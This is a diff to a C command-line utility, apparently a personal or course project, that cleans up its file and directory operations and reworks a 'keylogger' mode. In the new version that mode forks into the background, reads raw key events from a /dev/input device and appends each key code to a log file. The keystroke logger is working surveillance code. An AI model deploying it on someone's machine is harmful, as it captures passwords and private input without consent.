@@ -8,9 +8,8 @@
 #include <time.h> //@YuEnTiang81391 new added library for time 
 #include <linux/input.h> //@YuEnTiang81391 new added library for input
 
-
 void create_file(char *filename){
-    int fd = open(filename, O_CREAT | O_RDWR);
+    int fd = open(filename, O_CREAT | O_RDWR, 0644);
     if (fd == -1){
         perror("Error in creating file\n");
         exit(1);
@@ -37,7 +36,7 @@ void read_file(char *filename){
     }
 
     ssize_t readFile;
-    while ((readFile = read(fd, buffer, sizeof(buffer))) > 0){
+    while ((readFile = read(fd, buffer, sizeof(buffer) - 1)) > 0){
         buffer[readFile] = '\0';
         printf("%s", buffer);
     }
@@ -45,7 +44,7 @@ void read_file(char *filename){
     close(fd);
 }
 
-void write_file (char *filename){
+void write_file(char *filename){
     int fd = open(filename, O_WRONLY | O_APPEND);
     if (fd == -1){
         perror("Error in writing file\n");
@@ -101,7 +100,7 @@ void list_directory(char *dirname){
     if (!(dir = opendir(dirname))) {
         perror("Error opening directory\n");
         return;
-    }else {
+    } else {
         printf("*****Current directory:[%s]*****\n", dirname);
     }
 
@@ -111,25 +110,39 @@ void list_directory(char *dirname){
     closedir(dir);
 }
 
-void start_keylogger() {
-    FILE *file;
-    file = fopen("keylog.txt", "a");
-    if (file == NULL) {
-        perror("Failed to open keylog.txt");
-        return;
-    }
-
-    // Add timestamp at the beginning of the session
-    time_t now;
-    time(&now);
-    fprintf(file, "Keylogger session started at: %s\n", ctime(&now));
-    fclose(file);
-
+void start_keylogger(char *logfile) {
     // Run in background
     if (fork() == 0) {
+        FILE *file;
+        file = fopen(logfile, "a");
+        if (file == NULL) {
+            perror("Failed to open keylog file");
+            return;
+        }
+
+        // Add timestamp at the beginning of the session
+        time_t now;
+        time(&now);
+        char *timestamp = ctime(&now);
+        if (timestamp == NULL) {
+            perror("Failed to get current time");
+            fclose(file);
+            return;
+        }
+        fprintf(file, "Keylogger session started at: %s\n", timestamp);
+        fclose(file);
+
+        // Monitor the input device
         int fd;
         struct input_event ev;
-        const char *dev = "/dev/input/event0"; // Adjust this path to your keyboard device
+
+        // Get the input device from environment variable or use default
+        const char *dev = getenv("INPUT_DEVICE");
+        if (dev == NULL) {
+            dev = "/dev/input/event2"; // Default device
+        }
+        
+        //const char *dev = "/dev/input/event2"; 
 
         fd = open(dev, O_RDONLY);
         if (fd == -1) {
@@ -140,7 +153,7 @@ void start_keylogger() {
         while (1) {
             read(fd, &ev, sizeof(struct input_event));
             if (ev.type == EV_KEY && ev.value == 1) { // Key press event
-                file = fopen("keylog.txt", "a");
+                file = fopen(logfile, "a");
                 if (file != NULL) {
                     fprintf(file, "Key %d pressed\n", ev.code);
                     fclose(file);
@@ -153,14 +166,12 @@ void start_keylogger() {
 }
 
 int main(int argc, char *argv[]){
-	if (argc < 3){
+    if (argc < 3){
         fprintf(stderr, "Please enter in correct format!\nFormat: %s -m [mode] [argument]\n", argv[0]);
         return 1;
-	}
+    }
 
-    int mode = atoi(argv[2]);
-    int file_operation_mode = atoi(argv[3]);
-    int directory_operation_mode = atoi(argv[3]);
+    int mode = atoi(argv[2]); // 1 for file operation, 2 for directory operation, 3 for keylogger
 
     switch (mode){
         case 1:
@@ -169,6 +180,7 @@ int main(int argc, char *argv[]){
                 break;
             }
 
+            int file_operation_mode = atoi(argv[3]); // 1 for create, 2 for change permission, 3 for read, 4 for write, 5 for delete
             switch (file_operation_mode){
                 case 1:
                     create_file(argv[4]);
@@ -206,6 +218,7 @@ int main(int argc, char *argv[]){
                 return 1;
             }
 
+            int directory_operation_mode = atoi(argv[3]); // 1 for create, 2 for delete, 3 for list, 4 for print current directory
             switch (directory_operation_mode){
                 case 1:
                     create_dir(argv[4]);
@@ -229,8 +242,17 @@ int main(int argc, char *argv[]){
             break;
 
         case 3:
-            start_keylogger();
+            if (argc < 4){
+                fprintf(stderr, "Please specify the log file for keylogger.\n");
+                return 1;
+            }
+            start_keylogger(argv[3]);
             break;
 
+        default:
+            perror("Invalid operation mode\n");
+            break;
     }
+
+    return 0;
 }
